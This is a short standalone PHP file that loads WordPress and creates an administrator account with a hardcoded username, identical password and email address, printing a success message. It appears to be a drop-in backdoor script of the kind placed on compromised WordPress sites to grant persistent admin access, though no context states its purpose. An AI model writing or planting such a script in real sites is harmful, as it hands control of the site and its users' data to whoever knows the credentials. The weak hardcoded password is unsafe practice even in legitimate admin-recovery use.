<?php
// Load WordPress
require_once('wp-load.php');
require_once('wp-includes/pluggable.php');

// Default username and password
$username = 'aryaportal';
$password = 'aryaportal';
$email = 'aryaportal@gmail.com';

// Check if the user already exists
if (!username_exists($username) && !email_exists($email)) {
    // Create the user
    $user_id = wp_create_user($username, $password, $email);

    // Get the user object
    $user = new WP_User($user_id);

    // Set the role to administrator
    $user->set_role('administrator');

    echo 'Admin user created successfully.';
} else {
    echo 'User already exists.';
}
?>
